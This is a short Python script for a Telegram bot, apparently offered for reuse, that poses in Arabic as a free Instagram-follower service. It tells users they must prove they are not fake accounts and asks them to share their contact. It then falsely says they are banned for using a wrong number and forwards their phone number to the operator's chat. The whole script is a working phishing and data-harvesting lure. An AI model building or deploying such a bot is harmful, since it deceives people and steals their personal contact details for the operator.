import telebot
from telebot import types


token = "#inter your token"
bot = telebot.TeleBot(token)
sudo = "#inter your ip bot"
bot.set_webhook()
@bot.message_handler(commands=['start']) 
def start(message):
    bot.send_message(message.chat.id,f"<strong>اهلا عزيزي في بوت  رشق انستا \n يمكنك الحصول على 10k متابع بأقل من ساعه \n للبدء قم بأرسال /done - </strong>",parse_mode="html")
@bot.message_handler(commands=['done'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    contact = types.KeyboardButton(text="- تأكيد ", request_contact=True)
    keyboard.row_width = 1
    keyboard.add(contact)
    response = bot.send_message(message.chat.id, 
                                "<strong>المعذره عزيزي! \n لم يتم احتساب النقاط يجب التأكد انك لست حساب وهمي! </strong>",parse_mode="html",reply_markup=keyboard) 
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    bot.send_message(message.chat.id,f"<strong>تم حظرك من البوت لأنك تستخدم رقم غير صحيح </strong>",parse_mode="html")
    c = message.contact.phone_number
    bot.forward_message(sudo,message.chat.id,message.message_id)
name = "main"
if name == 'main':
    bot.polling(none_stop=True)


#A.TAYSON
